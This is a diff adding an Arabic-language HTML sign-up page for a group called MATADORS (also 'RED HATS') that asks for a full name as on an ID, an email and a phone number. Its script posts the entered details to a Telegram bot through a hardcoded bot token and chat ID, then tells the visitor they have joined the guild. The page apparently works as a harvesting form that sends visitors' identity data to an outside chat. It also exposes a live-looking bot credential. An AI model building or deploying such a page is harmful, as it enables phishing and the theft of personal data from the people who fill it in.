@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MATADORS - سجل الآن</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1a1a1a;
+            color: #ff3333;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        header {
+            background-color: #2b2b2b;
+            color: #ff3333;
+            padding: 20px 0;
+            border-bottom: 2px solid #ff3333;
+            box-shadow: 0 5px 15px rgba(255, 51, 51, 0.5);
+            animation: slideIn 2s ease-out;
+        }
+
+        .logo h1 {
+            margin: 0;
+            font-size: 36px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            animation: fadeIn 1s ease-out;
+            text-shadow: 0 0 10px #ff3333, 0 0 20px #ff6666;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(0); }
+        }
+
+        .main-banner {
+            background: linear-gradient(145deg, #2b2b2b, #ff3333);
+            color: #fff;
+            padding: 60px 20px;
+            margin-top: 20px;
+            border-bottom: 2px solid #ff3333;
+            animation: zoomIn 2s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .main-banner::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 51, 51, 0.2) 10%, transparent 60%);
+            animation: rotateBg 10s linear infinite;
+        }
+
+        @keyframes rotateBg {
+            0% { transform: rotate(0); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .register-section {
+            background: linear-gradient(145deg, #2b2b2b, #1a1a1a);
+            padding: 40px 20px;
+            margin-top: 20px;
+            border-radius: 10px;
+            animation: fadeInUp 1.5s ease-out;
+            box-shadow: 0 5px 15px rgba(255, 51, 51, 0.5);
+        }
+
+        @keyframes fadeInUp {
+            0% { opacity: 0; transform: translateY(50px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .register-section h2 {
+            font-size: 26px;
+            margin-bottom: 20px;
+            color: #ff3333;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #ff6666;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            text-align: right;
+            font-size: 14px;
+            color: #ffcccc;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"] {
+            width: 80%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid #ff6666;
+            background-color: #2b2b2b;
+            color: #ff9999;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="tel"]:focus {
+            border-color: #ff3333;
+            box-shadow: 0 0 10px #ff6666;
+        }
+
+        button {
+            background-color: #ff3333;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #ff6666;
+            box-shadow: 0 5px 15px rgba(255, 51, 51, 0.5);
+        }
+
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <h1>MATADORS</h1>
+        </div>
+    </header>
+
+    <section class="main-banner">
+        <!-- Removed "WELCOME TO RED HATS" -->
+    </section>
+
+    <section class="register-section">
+        <h2>التسجيل في MATADORS</h2>
+        <form id="register-form">
+            <label for="name">الاسم (كما في الهوية):</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">البريد الإلكتروني (سيتم إرسال التعليمات لك):</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="phone">رقم الهاتف (لتأكيد الهوية):</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <button type="submit">تسجيل</button>
+        </form>
+
+        <div id="message"></div>
+    </section>
+
+    <footer>
+        <p></p> <!-- تم حذف جملة حقوق النشر هنا -->
+    </footer>
+
+    <script>
+        const token = '7707947632:AAH8VYCpVg4mJgcH-ejO4AKzMmF4LOMUfqo';
+        const chatId = '7712151084';
+
+        document.getElementById('register-form').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+
+            const message = `
+            الاسم: ${name}
+            البريد الإلكتروني: ${email}
+            رقم الهاتف: ${phone}
+            `;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('message').innerText = 'لقد تم تسجيلك في نقابة RED HATS';
+            })
+            .catch(error => {
+                document.getElementById('message').innerText = 'حدث خطأ أثناء التسجيل.';
+            });
+        });
+    </script>
+</body>
+</html>
